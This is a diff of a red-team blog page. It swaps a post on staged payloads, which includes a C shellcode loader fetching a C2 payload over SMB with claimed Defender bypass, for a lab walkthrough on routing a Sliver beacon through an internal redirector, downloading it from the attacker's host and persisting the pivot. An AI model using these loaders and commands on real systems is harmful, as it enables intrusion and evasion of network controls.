@@ -11,30 +11,30 @@
     <meta name="generator" content="Retype 4.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>Staging vs Stageless payloads - Which one is Better?</title>
-    <meta name="title" content="Staging vs Stageless payloads - Which one is Better?">
-    <meta name="description" content="In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the Mythic C2 framework to successfully bypass Windows Defender — not through obfuscation or encryption, but purely by leveraging payload staging over SMB.">
+    <title>Bypassing Egress Firewalls with a Sliver C2 Redirector</title>
+    <meta name="title" content="Bypassing Egress Firewalls with a Sliver C2 Redirector">
+    <meta name="description" content="You land on an internal box, drop your beacon, and nothing calls back. You check twice, generate again, still nothing. The host is fine, the payload is fine, the C2 is fine.">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/malware-development/staging-vs-stageless-payloads-what-is-better/">
+    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/c2/bypassing-egress-firewalls-with-a-sliver-c2-redirector/">
     <link rel="sitemap" type="application/xml" title="Sitemap" href="https://lsecqt.github.io/Red-Teaming-Army/sitemap.xml">
 
     <!-- Open Graph -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/staging-vs-stageless-payloads-what-is-better/">
-    <meta property="og:title" content="Staging vs Stageless payloads - Which one is Better?">
-    <meta property="og:description" content="In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the Mythic C2 framework to successfully bypass Windows Defender — not through obfuscation or encryption, but purely by leveraging payload staging over SMB.">
+    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/c2/bypassing-egress-firewalls-with-a-sliver-c2-redirector/">
+    <meta property="og:title" content="Bypassing Egress Firewalls with a Sliver C2 Redirector">
+    <meta property="og:description" content="You land on an internal box, drop your beacon, and nothing calls back. You check twice, generate again, still nothing. The host is fine, the payload is fine, the C2 is fine.">
     <meta property="og:site_name" content="Red Teaming Army">
     <meta property="og:locale" content="en_US">
 
     <!-- Twitter -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/staging-vs-stageless-payloads-what-is-better/">
-    <meta name="twitter:title" content="Staging vs Stageless payloads - Which one is Better?">
-    <meta name="twitter:description" content="In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the Mythic C2 framework to successfully bypass Windows Defender — not through obfuscation or encryption, but purely by leveraging payload staging over SMB.">
+    <meta name="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/c2/bypassing-egress-firewalls-with-a-sliver-c2-redirector/">
+    <meta name="twitter:title" content="Bypassing Egress Firewalls with a Sliver C2 Redirector">
+    <meta name="twitter:description" content="You land on an internal box, drop your beacon, and nothing calls back. You check twice, generate again, still nothing. The host is fine, the payload is fine, the C2 is fine.">
 
     <!-- Alternate Markdown -->
-    <link rel="alternate" type="text/markdown" href="https://lsecqt.github.io/Red-Teaming-Army/malware-development/staging-vs-stageless-payloads-what-is-better/staging-vs-stageless-payloads-what-is-better.md">
+    <link rel="alternate" type="text/markdown" href="https://lsecqt.github.io/Red-Teaming-Army/c2/bypassing-egress-firewalls-with-a-sliver-c2-redirector/bypassing-egress-firewalls-with-a-sliver-c2-redirector.md">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
@@ -44,7 +44,6 @@
     <script data-cfasync="false" src="../../resources/js/config.js?v=4.6.0.839098881714" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=4.6.0" data-turbo-eval="false" defer></script>
     <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=4.6.0.839098881714" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=4.6.0.839098881714" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -275,147 +274,134 @@
                 <doc-page-actions></doc-page-actions>
 
                 <!-- Page content  -->
-<h1 id="staging-vs-stageless-payloads---which-one-is-better">Staging vs Stageless payloads - Which one is Better?</h1>
-<h2 id="intro">Intro</h2>
-<p>In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the <strong>Mythic C2 framework</strong> to successfully bypass <strong>Windows Defender</strong> — not through obfuscation or encryption, but purely by leveraging <strong>payload staging over SMB</strong>.</p>
-<p><span class="docs-emoji">&#x1F4FA;</span> <strong>Watch the full video here</strong>: <a href="https://youtu.be/CSt5wcvNjBU">https://youtu.be/CSt5wcvNjBU</a></p>
-<p>Before diving deeper into this topic, make sure to join my <a href="https://discord.gg/bgSpdheEgu">Discord</a> where we share experience, knowledge and doing CTFs together.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>If you have further appreciation for my work, don&#x27;t hesitate to become my <a href="https://www.patreon.com/Lsecqt">Patreon</a>! This way, you help the Red Teaming Army grow, while getting access to private tools such as the ShadowBurn packer.</p>
-        </div>
+<h1 id="bypassing-egress-firewalls-with-a-sliver-c2-redirector">Bypassing Egress Firewalls with a Sliver C2 Redirector</h1>
+<h2 id="introduction">Introduction</h2>
+<p>You land on an internal box, drop your beacon, and nothing calls back. You check twice, generate again, still nothing. The host is fine, the payload is fine, the C2 is fine. What&#x27;s killing you is the firewall. The server you are sitting on has no business talking to the internet, so the outbound traffic to your Kali just gets dropped at the gateway.</p>
+<p>This is a very normal situation on real engagements. Servers usually have strict outbound rules, and honestly that is how it should be. In this post I want to show how I get around it in practice, using an internal workstation as a redirector so the beacon reaches me anyway. The tool doing the actual traffic relaying is my own <a href="https://github.com/lsecqt/PortForwarder">PortForwarder</a>, and the C2 in this demo is Sliver.</p>
+<p>If you prefer watching over reading, here is the video version. If you enjoy the content, feel free to subscribe:</p>
+<p>
+<figure>
+    <div class="relative w-full mb-6 overflow-hidden pt-9/16">
+        <iframe class="w-full h-full border-0 absolute inset-0" src="https://www.youtube.com/embed/iAVS2ur3O6w" allowfullscreen></iframe>
     </div>
-</div>
-<h2 id="what-is-a-stageless-payload">What is a Stageless Payload?</h2>
-<p>A <strong>stageless payload</strong> is a single, self-contained binary or script that includes the entire functionality of the final payload at once. When executed, it immediately initiates a connection back to the C2 (Command and Control) server without requiring any additional downloads or secondary stages.</p>
-<p><strong>Characteristics:</strong></p>
-<ul>
-<li>Contains both the loader and full payload logic.</li>
-<li>Easier to detect by security tools due to its size and complexity.</li>
-<li>Useful when staging isn&#x27;t possible (e.g., no or restricted network access).</li>
-<li>Requires more effort to obfuscate and hide in memory.</li>
-</ul>
-<figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185040.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
 </figure>
-<h2 id="what-is-a-staged-payload">What is a Staged Payload?</h2>
-<p>A <strong>staged payload</strong> breaks the delivery into two or more parts. The initial stage (the stager) is small and lightweight — its only job is to download or retrieve the second stage (the full payload) from a specified location (e.g., an SMB server, HTTP server, etc.).</p>
-<p><strong>Characteristics:</strong></p>
-<ul>
-<li>Smaller initial binary, making it easier to deliver and evade defenses.</li>
-<li>The second stage can be dynamically fetched or built in memory.</li>
-<li>More modular and flexible for C2 communications.</li>
-<li>Detection can be bypassed by isolating or encrypting the second stage.</li>
-</ul>
-<figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185054.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-<h2 id="demo">Demo</h2>
-<p>This section contains the live demonstration and technical walkthrough of the technique. It includes code snippets, configurations, and output logs relevant to staging payloads over SMB using Mythic C2.</p>
-<p>During the demo I used Mythic C2 (<a href="https://github.com/its-a-feature/Mythic">https://github.com/its-a-feature/Mythic</a>) but the technique is applicable and recommended for any C2 framework.</p>
-<p>The code was compiled from my Offensive CPP Repository:</p>
-<ul>
-<li>
-<p>SMB Staging code: <a href="https://github.com/lsecqt/OffensiveCpp/blob/main/Staging%20Techniques/SMB_Stage.c">https://github.com/lsecqt/OffensiveCpp/blob/main/Staging%20Techniques/SMB_Stage.c</a></p>
-</li>
-<li>
-<p>Direct Pointer Shellcode Execution Blogpost: <a href="https://lsecqt.github.io/Red-Teaming-Army/malware-development/leveraging-the-direct-pointer-a-stealthy-maneuver-in-evasion-tactics/">https://lsecqt.github.io/Red-Teaming-Army/malware-development/leveraging-the-direct-pointer-a-stealthy-maneuver-in-evasion-tactics/</a></p>
-</li>
-</ul>
-<p>During the video, I created the following code:</p>
-<div id="demo-code-1" class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-unsigned char buf[2120150] = &quot;&quot;;
-
-void readBin(const char* fileName) {
-	FILE* file;
-	DWORD file_length;
-
-	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hFile == NULL)
-	{
-		printf(&quot;Error opening file: %d\n&quot;, GetLastError());
-		exit(-99);
-	}
-
-	BOOL rez = ReadFile(hFile, &amp;buf, 2120150, NULL, NULL);
-	if (rez == FALSE)
-	{
-		printf(&quot;Error reading file: %d\n&quot;, GetLastError());
-		exit(-98);
-	}
-}
-
-int main()
-{
-	LPVOID pAddr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	readBin(&quot;\\\\192.168.0.185\\share\\apollo.bin&quot;);
-	memcpy(pAddr, buf, sizeof(buf));
-	((void(*)())pAddr)();
-
-}</code></pre>
-</doc-codeblock></div>
-<p>Here is important to note the size of <code translate="no" v-pre>unsigned char buf[2120150]</code>. The <code translate="no" v-pre>2120150</code> is the size of the payload generated from Mythic C2. If you do <code translate="no" v-pre>ls -l</code> you can note the size of the file and this is the same size you need here.</p>
-<p>Also, the size must be adjusted in here:</p>
-<div id="demo-code-2" class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">BOOL rez = ReadFile(hFile, &amp;buf, 2120150, NULL, NULL);</code></pre>
-</doc-codeblock></div>
-<p>Usually I would go for dynamic memory allocation but the point was to showcase the staging.</p>
-<hr>
-<p>Next we need to setup the server side. Since we are going to stage over SMB, <code translate="no" v-pre>impacket-smbserver</code> can do the job perfect for us.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>I will not go over setting up Mythic C2 as its already explained 
-<div class="mb-6 px-5 py-4 flex justify-between relative border border-base-border hover:border-base-border-hover rounded transition-colors duration-150">
-    <div class="flex items-center text-base-500">
-        <span class="inline-flex items-center justify-center leading-none">
-            <svg xmlns="http://www.w3.org/2000/svg" class="block shrink-0" width="20" height="20" viewBox="0 0 24 24" role="presentation" fill="currentColor"><path fill="none" d="M0 0h24v24H0z"/><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z"/></svg>
-        </span>
-        <span class="inline-block font-medium ml-2">here</span>
-    </div>
-    <div class="flex items-center text-xs text-gray-400 dark:text-dark-400">
-        <span>/infrastructure/setting20up20mythic20c2/setting20up20mythic20c2.md</span>
-    </div>
-    <a href="/infrastructure/setting20up20mythic20c2/setting20up20mythic20c2.md" class="absolute block inset-0"></a>
-</div>
 </p>
-        </div>
-    </div>
-</div>
-<p>To launch the SMB server we can do:</p>
-<div id="demo-code-3" class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">impacket-smbserver &lt;sharename&gt; &lt;sharepath&gt; -ts -debug -smb2support</code></pre>
+<p>Before we dive in, a quick shout to my patrons. The internal tooling I use on real engagements, including my custom agent, packer and the material that never lands on YouTube, all lives on my <a href="https://www.patreon.com/Lsecqt">Patreon</a>. If you want to go deeper into the offensive side, that is where the deeper stuff is, and it directly funds the free content on this blog.</p>
+<h2 id="the-demo-in-one-screenshot">The demo, in one screenshot</h2>
+<p>To set the stage, this is what we are going to build. On the right is <code translate="no" v-pre>SQL01</code>, an internal server that cannot reach my external Kali on its own. On the left is my Sliver on the Kali box. In the middle, doing the work quietly, is <code translate="no" v-pre>CLIENT01</code>, an internal workstation acting as the redirector. The beacon runs on <code translate="no" v-pre>SQL01</code>, the traffic bounces through <code translate="no" v-pre>CLIENT01</code>, and the callback lands in Sliver on the Kali.</p>
+<figure class="content-center">
+    <img src="demo_overview.png" alt="Sliver on the Kali receiving a beacon from SQL01 via the CLIENT01 redirector" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1429" height="496" />
+    <figcaption class="caption">Sliver on the Kali receiving a beacon from SQL01 via the CLIENT01 redirector</figcaption>
+</figure>
+<p>That is the whole trick. Now let me walk through why it works and how to set it up end to end.</p>
+<h2 id="the-environment">The environment</h2>
+<p>Nothing exotic here, just a small lab that mirrors what a real internal network looks like.</p>
+<ul>
+<li><code translate="no" v-pre>lsec.local</code>, my simulated Active Directory, sitting on <code translate="no" v-pre>172.16.0.0/16</code>.</li>
+<li>A domain controller, obviously.</li>
+<li><code translate="no" v-pre>SQL01</code>, an internal server with restricted outbound. This is our compromised host.</li>
+<li><code translate="no" v-pre>CLIENT01</code>, an internal workstation that can browse the internet, like most users are allowed to. IP <code translate="no" v-pre>172.16.32.206</code>.</li>
+<li>My Kali on <code translate="no" v-pre>192.168.0.160</code>, treated as external, sitting outside the AD subnet with the firewall in between.</li>
+</ul>
+<h2 id="why-the-beacon-dies">Why the beacon dies</h2>
+<p>On most engagements I see the same pattern. Workstations are allowed out because users need the internet, sometimes through a proxy, but they can reach external systems. Servers are locked down and cannot talk to anything outside. That is the correct configuration and I am glad when I see it, but as an attacker it means a beacon spawned on a server has no path home.</p>
+<p>If you land a foothold on <code translate="no" v-pre>SQL01</code> and the payload tries to call back to your Kali at <code translate="no" v-pre>192.168.0.160</code>, the firewall drops it. Same story for <code translate="no" v-pre>google.com</code> or anything else. From that server, out is out.</p>
+<h2 id="the-idea">The idea</h2>
+<p>If the server cannot reach us, we need a middle man that can. And since there is no outbound traffic at all from that server class, spinning up an external redirector on the internet is useless. The redirector has to sit inside the network, on a host that both the server can reach and that can reach out through the firewall.</p>
+<p>The workstation fits perfectly. <code translate="no" v-pre>SQL01</code> can talk to <code translate="no" v-pre>CLIENT01</code> on the internal network (no NAC in the way in most cases), and <code translate="no" v-pre>CLIENT01</code> can talk to my Kali through the firewall. So the chain becomes:</p>
+<p><code translate="no" v-pre>SQL01</code> (beacon) → <code translate="no" v-pre>CLIENT01</code> (redirector) → Kali (Sliver listener)</p>
+<p>That is it. The beacon thinks it is calling <code translate="no" v-pre>CLIENT01</code>. <code translate="no" v-pre>CLIENT01</code> blindly forwards that traffic to the Kali. Sliver receives it and hands us a session. From the server&#x27;s point of view nothing weird is happening, it is just talking to another box on its own subnet.</p>
+<h2 id="portforwarder">PortForwarder</h2>
+<p>The tool doing the relaying is <a href="https://github.com/lsecqt/PortForwarder">PortForwarder</a>, a small C tool I wrote for exactly this. It does one thing: listen on a local port, and forward whatever comes in to a target IP and port. That is all.</p>
+<p>Typical usage:</p>
+<div id="portforwarder-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">PortForwarder.exe &lt;listen_port&gt; &lt;destination_ip&gt; &lt;destination_port&gt;</code></pre>
 </doc-codeblock></div>
-<p>In our case I am using the CWD (Current Working Directory):</p>
-<div id="demo-code-4" class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">impacket-smbserver share . -ts -debug -smb2support</code></pre>
+<p>Add <code translate="no" v-pre>-v</code> if you want to see per connection detail at runtime.</p>
+<p>One small thing worth calling out: it can also forward port 445. That port is normally occupied by the local SMB service, so binding to it would fail. If you run PortForwarder as admin and give it 445, it will stop the SMB service, free the port, and then start forwarding. Handy when you need to relay SMB through a pivot.</p>
+<p>In practice, in real engagements, the ports I forward most are 443 for HTTPS C2 and 445 for SMB. Any port works, those are just the two that come up.</p>
+<figure class="content-center">
+    <img src="portforwarder_help.png" alt="PortForwarder usage on CLIENT01" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="752" height="151" />
+    <figcaption class="caption">PortForwarder usage on CLIENT01</figcaption>
+</figure>
+<h2 id="generating-the-beacon">Generating the beacon</h2>
+<p>Now to the Sliver side. I want to generate a beacon that will run on <code translate="no" v-pre>SQL01</code>, but the critical thing is the callback address. It must point at the redirector, not at the Kali. If you point it at the Kali, the beacon will try to reach the Kali directly, hit the firewall, and die exactly like before. The whole point is to make the beacon talk to <code translate="no" v-pre>CLIENT01</code> and let the redirector do the outbound leg.</p>
+<p>Two small quality of life things in Sliver I want to mention while I am here. Backspace now deletes a whole word by default, which used to drive me mad. And <code translate="no" v-pre>generate beacon</code> on its own now launches a wizard that walks you through every option, so you do not have to remember every flag.</p>
+<p>Fire it up:</p>
+<div id="generating-the-beacon-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">generate beacon</code></pre>
 </doc-codeblock></div>
+<p>Then answer the wizard:</p>
+<ul>
+<li><strong>Common platforms only:</strong> yes</li>
+<li><strong>Operating system:</strong> Windows</li>
+<li><strong>Architecture:</strong> amd64</li>
+<li><strong>Output format:</strong> executable (you also have shared library, service, shellcode and a few others)</li>
+<li><strong>Implant name:</strong> <code translate="no" v-pre>redirector</code> (optional, otherwise Sliver picks a random one)</li>
+<li><strong>C2 transport:</strong> HTTPS</li>
+</ul>
+<p>The C2 transport must match the listener you have running. If you started an HTTPS listener with <code translate="no" v-pre>https</code>, use HTTPS here. If you started <code translate="no" v-pre>mtls</code>, use MTLS. They are not interchangeable. In another Sliver pane you can check with <code translate="no" v-pre>jobs</code> to see what is listening.</p>
+<figure class="content-center">
+    <img src="sliver_wizard.png" alt="Sliver beacon generation wizard" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="768" height="485" />
+    <figcaption class="caption">Sliver beacon generation wizard</figcaption>
+</figure>
+<p>Now the important field:</p>
+<ul>
+<li><strong>C2 endpoint:</strong> <code translate="no" v-pre>https://172.16.32.206</code></li>
+</ul>
+<p>That IP is <code translate="no" v-pre>CLIENT01</code>, the redirector. Not the Kali. Since my HTTPS listener is on the default 443 I do not need to specify a port, but if your listener runs on anything else you must include it here.</p>
+<p>Finally set the beacon interval to 5 and jitter to 5. If you set the interval below 5 seconds Sliver will error out, so if you want faster than that use a direct session instead of a beacon.</p>
+<figure class="content-center">
+    <img src="beacon_generated.png" alt="Sliver reporting the beacon has been generated" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="711" height="209" />
+    <figcaption class="caption">Sliver reporting the beacon has been generated</figcaption>
+</figure>
+<h2 id="delivering-the-beacon-to-sql01">Delivering the beacon to SQL01</h2>
+<p>Standard fetch. On the Kali:</p>
+<div id="delivering-the-beacon-to-sql01-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">python3 -m http.server 80</code></pre>
+</doc-codeblock></div>
+<p>On <code translate="no" v-pre>SQL01</code> from PowerShell:</p>
+<div id="delivering-the-beacon-to-sql01-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">iwr http://192.168.0.160/redirector.exe -OutFile up.exe -UseBasicParsing</code></pre>
+</doc-codeblock></div>
+<p>(In the video I fat fingered the IP once, muscle memory from an old VM, then corrected it. Nothing exotic.)</p>
+<figure class="content-center">
+    <img src="beacon_download.png" alt="Downloading the beacon onto SQL01" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="522" height="60" />
+    <figcaption class="caption">Downloading the beacon onto SQL01</figcaption>
+</figure>
+<p>Do not run it yet. If PortForwarder is not up on <code translate="no" v-pre>CLIENT01</code> when the beacon fires, the beacon will call the redirector, get nothing back, and you get nothing.</p>
+<h2 id="setting-up-the-redirector-on-client01">Setting up the redirector on CLIENT01</h2>
+<p>Drop <code translate="no" v-pre>PortForwarder.exe</code> on <code translate="no" v-pre>CLIENT01</code>. From an admin PowerShell:</p>
+<div id="setting-up-the-redirector-on-client01-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">PortForwarder.exe 443 192.168.0.160 443</code></pre>
+</doc-codeblock></div>
+<p>That opens 443 locally on the workstation and forwards every connection to the Kali on 443, which is where the Sliver HTTPS listener sits. The listen port on the redirector must match the port the beacon is trying to hit (443), and the destination port must match the Sliver listener (also 443 in my case).</p>
+<figure class="content-center">
+    <img src="portforwarder_running.png" alt="PortForwarder running on CLIENT01 as the redirector" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="534" height="173" />
+    <figcaption class="caption">PortForwarder running on CLIENT01 as the redirector</figcaption>
+</figure>
+<h2 id="firing-the-beacon">Firing the beacon</h2>
+<p>Back to <code translate="no" v-pre>SQL01</code>, run the payload:</p>
+<div id="firing-the-beacon-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">.\redirector.exe</code></pre>
+</doc-codeblock></div>
+<p>Within a beacon interval the callback lands in Sliver. If you look at the PortForwarder window on <code translate="no" v-pre>CLIENT01</code> you can watch the traffic go through in real time, which is a nice sanity check that the redirector is doing its job.</p>
+<figure class="content-center">
+    <img src="beacon_callback.png" alt="Fresh beacon from SQL01 landing in Sliver via the redirector" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1159" height="116" />
+    <figcaption class="caption">Fresh beacon from SQL01 landing in Sliver via the redirector</figcaption>
+</figure>
+<p>From there it is business as usual. Attach to the beacon, and if you want more responsiveness you can even spawn an interactive session on top of it and it will still route cleanly through the redirector. Sessions are not officially guaranteed over this setup, but in my testing they work fine as long as the redirector stays alive.</p>
+<div id="firing-the-beacon-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">beacons
+use &lt;beacon_id&gt;
+interactive</code></pre>
+</doc-codeblock></div>
+<figure class="content-center">
+    <img src="session_list.png" alt="Interactive session on SQL01 listed in Sliver" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1160" height="409" />
+    <figcaption class="caption">Interactive session on SQL01 listed in Sliver</figcaption>
+</figure>
+<h2 id="the-one-thing-that-will-bite-you">The one thing that will bite you</h2>
+<p>The whole chain lives and dies with <code translate="no" v-pre>CLIENT01</code>. If the workstation reboots, sleeps, or someone closes the PortForwarder window, your beacon is gone. Not paused, gone. The moment the redirector stops relaying, any command you send times out, the beacon marks itself as implant timeout, and until you get PortForwarder running again on that host you have no callback.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -429,50 +415,15 @@ int main()
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p><code translate="no" v-pre>&lt;sharename&gt;</code> must be the same as the one specific here:
-<code translate="no" v-pre>readBin(&quot;\\\\192.168.0.185\\share\\apollo.bin&quot;);</code></p>
+<p>Most workstations sleep after a while by default. On a real engagement, make sure the redirector host has a way to stay awake. A caffeine style utility, a scheduled task that nudges it, or just poking it manually every so often. Otherwise your access dies with the screensaver.</p>
         </div>
     </div>
 </div>
-<figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185230.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-<figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185241.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-<p>C2 Callback came immediate while Defender was turned on.</p>
-<figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185255.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-<figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185304.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-<p>Additionally, we also received the NTLMv2 hash of the user because of the SMB communication.</p>
-<figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185420.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>This is demonstration only for staging technique. Even though it bypassed Defender do no think it is enough. Malware development is a combination of techniques!</p>
-        </div>
-    </div>
-</div>
+<p>If you want something more resilient, you have a few options. Persist PortForwarder as a service or a scheduled task on the workstation so it comes back after a reboot. Pick a machine you know is left on. Or, better, chain more than one redirector so a single host going down does not sink the whole thing.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Egress restrictions on servers are one of the most common reasons a beacon does not come back, and the fix is not to fight the firewall, it is to route around it using a host that is already allowed to talk out. A workstation you already own on the internal network is usually the ideal candidate. PortForwarder gives you a simple, low ceremony way to turn that workstation into a redirector, and Sliver does not care that the beacon is talking to a middle man, as long as the C2 endpoint on the beacon matches the redirector&#x27;s address.</p>
+<p>On the defensive side, this technique lives in the gap between two controls. The egress rules on the server are doing their job perfectly, the traffic never leaves the server for the internet directly. What is missing is visibility on internal to internal traffic. A workstation suddenly listening on 443 and forwarding to an external IP is worth catching. Egress logging on the workstation subnet, EDR alerts on unusual listening ports, and blocking arbitrary outbound HTTPS from user machines all help close this down.</p>
